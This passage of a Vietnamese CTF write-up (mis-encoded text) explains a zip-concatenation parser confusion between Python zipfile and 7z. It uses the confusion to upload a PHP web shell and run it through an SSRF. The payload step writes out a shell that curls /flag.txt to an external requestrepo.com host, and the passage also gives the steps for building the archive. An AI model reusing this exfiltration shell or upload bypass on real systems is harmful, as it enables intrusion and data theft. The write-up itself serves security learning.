<p>Trong khi app1 thá»±c hiá»‡n kiá»ƒm tra file zip upload vá»›i thÆ° viá»‡n <code>zipfile</code> thÃ¬ app2 láº¡i sá»­ dá»¥ng <code>Archive7z\Archive7z</code> hay cÃ´ng cá»¥ <code>7z</code> Ä‘á»ƒ thá»±c hiá»‡n giáº£i nÃ©n file zip.</p>
<blockquote>
<p>Báº¡n cÃ³ thá»ƒ chá»§ Ä‘á»™ng tÃ¬m hiá»ƒu thÃªm vá» cáº¥u trÃºc file zip Ä‘á»ƒ hiá»ƒu rÃµ hÆ¡n bÃ i wriuteup, bÃ i wriueup khÃ´ng Ä‘i sÃ¢u vÃ o phÃ¢n tÃ­ch cáº¥u trÃºc file zip hay giáº£i thÃ­ch cá»¥ thá»ƒ vá» lá»— há»•ng zip concatenation</p>
</blockquote>
<p>Äi vÃ o chi tiáº¿t hÆ¡n cÃ¡ch mÃ  2 trÃ¬nh zip parser nÃ y hoáº¡t Ä‘á»™ng:</p>
<ul>
<li><strong>Äá»‘i vá»›i <code>python zipfile</code></strong>, trÃ¬nh Ä‘á»c zip nÃ y khÃ´ng báº¯t Ä‘áº§u Ä‘á»c tá»« Ä‘áº§u tá»‡p mÃ  thay vÃ o Ä‘Ã³, nÃ³ quÃ©t ngÆ°á»£c tá»« cuá»‘i file Ä‘á»ƒ tÃ¬m kiáº¿m láº§n lÆ°á»£t <strong>End of Central Directory</strong>,  <strong>Central Directory</strong>, <strong>file entry</strong> dá»±a trÃªn offset.
<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rkWyeumCll.png"></li>
<li><strong>Äá»‘i vá»›i <code>7z</code></strong>, Ä‘á»‹nh dáº¡ng nÃ y Ä‘áº·t signature vÃ  cÃ¡c header cá»§a nÃ³ á»Ÿ Ä‘áº§u tá»‡p. CÃ´ng cá»¥ 7z báº¯t Ä‘áº§u phÃ¢n tÃ­ch file zip tá»« Ä‘áº§u tá»‡p (offset = 0)
<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SJBGg_QRgl.png"></li>
</ul>
<p>-&gt; Äiá»ƒm khÃ´ng Ä‘á»“ng nháº¥t á»Ÿ Ä‘Ã¢y cÃ¹ng vá»›i hÃ¬nh áº£nh mÃ´ táº£ cá»§a challenge gá»£i cho tÃ´i Ã½ tÆ°á»Ÿng vá» viá»‡c táº­n dá»¥ng Ä‘iá»ƒm khÃ¡c biá»‡t cá»§a 2 trÃ¬nh zip parser Ä‘á»ƒ táº¡o má»™t file zip há»£p lá»‡ vá»›i cáº£ 2 trÃ¬nh parser tuy nhiÃªn ná»™i dung Ä‘á»c Ä‘Æ°á»£c cá»§a chÃºng láº¡i khÃ¡c nhau bá»Ÿi cÆ¡ cháº¿ phÃ¢n tÃ­ch cá»§a chÃºng khÃ¡c nhau.</p>
<p>TÃ¬m hiá»ƒu thÃªm má»™t vÃ i kÄ© thuáº­t táº¥n cÃ´ng liÃªn quan Ä‘áº¿n Ä‘á»‹nh dáº¡ng file Zip tÃ´i tÃ¬m Ä‘Æ°á»£c kÄ© thuáº­t <strong>Zip Concatenation</strong> phÃ¹ há»£p vá»›i tÃ¬nh huá»‘ng lá»— há»•ng nÃ y</p>
<h2 id="2-lÃ m-tháº¿-nÃ o-Ä‘á»ƒ-cÃ³-thá»ƒ-thá»±c-thi-file-php-náº¿u-Ä‘Ã£-upload-Ä‘Æ°á»£c-thÃ nh-cÃ´ng---ssrf">2. LÃ m tháº¿ nÃ o Ä‘á»ƒ cÃ³ thá»ƒ thá»±c thi file php náº¿u Ä‘Ã£ upload Ä‘Æ°á»£c thÃ nh cÃ´ng -&gt; SSRF<a hidden class="anchor" aria-hidden="true" href="#2-lÃ m-tháº¿-nÃ o-Ä‘á»ƒ-cÃ³-thá»ƒ-thá»±c-thi-file-php-náº¿u-Ä‘Ã£-upload-Ä‘Æ°á»£c-thÃ nh-cÃ´ng---ssrf">#</a></h2>
<p>á»¨ng dá»¥ng app1 cho phÃ©p kiá»ƒm tra hoáº¡t Ä‘á»™ng cá»§a backend táº¡i endpoint GET <code>/gateway/health</code>. Endpoint nÃ y nháº­n vÃ o params <code>module</code>, input nÃ y Ä‘Æ°á»£c ná»‘i chuá»—i vÃ o <code>storage_url</code> mÃ  khÃ´ng qua kiá»ƒm tra sÃ ng lá»c dáº«n Ä‘áº¿n cÃ³ thá»ƒ khai thÃ¡c SSRF á»Ÿ Ä‘Ã¢y Ä‘á»ƒ gá»i Ä‘áº¿n file php Ä‘Æ°á»£c upload -&gt; Thá»±c thi thÃ nh cÃ´ng file .php
<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HkQzR770lx.png"></p>
<h1 id="-exploit">ğŸ”¥ Exploit<a hidden class="anchor" aria-hidden="true" href="#-exploit">#</a></h1>
<h2 id="táº¡o-payload">Táº¡o payload<a hidden class="anchor" aria-hidden="true" href="#táº¡o-payload">#</a></h2>
<ol>
<li>Táº¡o file zip an toÃ n chá»©a cÃ¡c file entry phÃ¹ há»£p vá»›i whitelist cá»§a challenge</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo helloworld &gt; user.txt
</span></span><span style="display:flex;"><span>zip user.zip user.txt &gt;/dev/null
</span></span></code></pre></div><ol start="2">
<li>Táº¡o 7z archive chá»©a web shell</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;&lt;?php system(&#34;curl https://w4zhdt6e.requestrepo.com/ -F \&#34;file=@/flag.txt\&#34;&#34;) ?&gt;&#39;</span> &gt; shell.php
</span></span><span style="display:flex;"><span>7z a -t7z evil.7z shell.php &gt;/dev/null
</span></span></code></pre></div><p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/B1Fc8jmRxe.png"></p>
<p>File nÃ y cÃ³ kÃ­ch thÆ°á»›c lÃ  207 bytes (0xCF bytes)</p>
<ol start="3">
<li>Chá»‰nh sá»­a payload sao cho há»£p lá»‡ vá»›i zipfile</li>
</ol>
<p>ChÃºng ta sáº½ thá»±c hiá»‡n ná»‘i 2 file Ä‘Æ¡n giáº£n báº±ng viá»‡c sá»­ dá»¥ng lá»‡nh cat</p>
<pre tabindex="0"><code>cat evil.zip user.zip &gt; zipconcat.zip
</code></pre><p>Tuy nhiÃªn file zip nÃ y chÆ°a há»£p lá»‡ bá»Ÿi viá»‡c thÃªm trÆ°á»›c file zip má»™t file 7z sáº½ khiáº¿n offset cá»§a pháº§n user.zip bá»‹ thay Ä‘á»•i, do Ä‘Ã³ cáº§n thá»±c hiá»‡n chá»‰nh sá»­a offset sao cho payload nÃ y há»£p lá»‡ vá»›i zipfile</p>
<p>CÃ¡c 2 vá»‹ trÃ­ offset cáº§n thay Ä‘á»•i (9D bá»Ÿi thÃªm vÃ o trÆ°á»›c file nÃ y 0x9D bytes) lÃ :</p>
<ul>
<li>offset tá»›i Central Directory:
<ul>
<li>náº±m trong pháº§n End of Centrol directory</li>
<li>cÃ³ giÃ¡ trá»‹ lÃ  4D</li>
<li>chá»‰nh sá»­a thÃ nh <code>11C = 4D + CF</code></li>
</ul>
</li>
<li>offset tá»›i Local file Header
<ul>
<li>náº±m táº¡i offset 42 tÃ¬nh tá»« Ä‘áº§u má»—i Central Directory</li>
<li>cÃ³ giÃ¡ trá»‹ lÃ  00</li>
<li>chá»‰nh sá»­a thÃ nh <code>CF = 00 + CF</code></li>
</ul>
</li>
</ul>
<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/ByUSdi7Agl.png"></p>
<p>Trá»±c tiáº¿p thay Ä‘á»•i offset báº±ng viá»‡c sá»­ dá»¥ng hex editor</p>
<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SJzXYoXRgx.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat evil.7z user.zip &gt; zipconcat.zip
</span></span></code></pre></div><ol start="4">
<li>
<p>Kiá»ƒm tra file vá»›i python zipfile
<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Hkxtz5XCle.png"></p>
</li>
<li>
<p>Kiá»ƒm tra file zip vá»›i 7z
VÃ¬ táº­p lá»‡nh Ä‘áº·t tá»‡p lÆ°u trá»¯ 7z á»Ÿ ngay Ä‘áº§u tá»‡p Ä‘Æ°á»£c káº¿t há»£p, nÃªn cÃ¡c cÃ´ng cá»¥ 7z sáº½ coi tá»‡p Ä‘Æ°á»£c káº¿t há»£p nhÆ° má»™t tá»‡p lÆ°u trá»¯ 7z bÃ¬nh thÆ°á»ng vÃ  trÃ­ch xuáº¥t ná»™i dung 7z (tá»‡p PHP trong vÃ­ dá»¥ cá»§a báº¡n) mÃ  khÃ´ng cáº§n Ä‘á»™ng Ä‘áº¿n cÃ¡c cáº¥u trÃºc ZIP Ä‘Æ°á»£c thÃªm vÃ o phÃ­a dÆ°á»›i
<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJcpMcQRxg.png">
Máº·c dÃ¹ cÃ³ thÃ´ng bÃ¡o lá»—i bá»Ÿi 7z phÃ¡t hiá»‡n cÃ²n cÃ¡c bytes á»Ÿ cuá»‘i file nhÆ°ng payload váº«n Ä‘Æ°á»£c giáº£i nÃ©n thÃ nh cÃ´ng
<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r18ZQ5X0ee.png"></p>
</li>
</ol>
<h2 id="thá»±c-hiá»‡n-táº¥n-cÃ´ng">Thá»±c hiá»‡n táº¥n cÃ´ng<a hidden class="anchor" aria-hidden="true" href="#thá»±c-hiá»‡n-táº¥n-cÃ´ng">#</a></h2>
<p>Táº¡o tÃ i khoÃ n ngÆ°á»i dÃ¹ng vÃ  láº¥y Authorization token (JWT):</p>
<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rycWGimRlg.png"></p>
<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/H1i1zjQRxe.png"></p>
<p>Thá»±c hiá»‡n upload file payload vá»«a táº¡o vá»›i Authorization header chá»©a token vá»«a láº¥y Ä‘Æ°á»£c</p>
<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/ryTOMjmAex.png"></p>
<p>Thá»±c hiá»‡n SSRF thá»ƒ thá»±c thi file php Ä‘Ã£ upload, tuy nhiÃªn cáº§n xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c vá»‹ trÃ­ cá»§a file trÃªn server</p>
<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Byhx3qmRxl.png"></p>
<p>File sau khi extract Ä‘Æ°á»£c lÆ°u táº¡i thÆ° má»¥c <code>upload/&lt;user_id&gt;</code>, chÃºng ta cÃ³ thá»ƒ dá»… dÃ ng tÃ¬m Ä‘Æ°á»£c user id trong JWT token</p>
<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r1lafjmCee.png"></p>
<p>Thá»±c hiá»‡n SSRF</p>
<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SkFocoQRxx.png"></p>
<p>Máº·c dÃ¹ request tráº£ vá» &ldquo;ERR&rdquo; nhÆ°ng chÃºng ta váº«n thÃ nh cÃ´ng láº¥y Ä‘Æ°á»£c flag</p>
<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r1wxjo70el.png"></p>
<h1 id="-exp">ğŸ† EXP<a hidden class="anchor" aria-hidden="true" href="#-exp">#</a></h1>
<p>-&gt; Zip Concatenation</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
    </ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">Blog</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
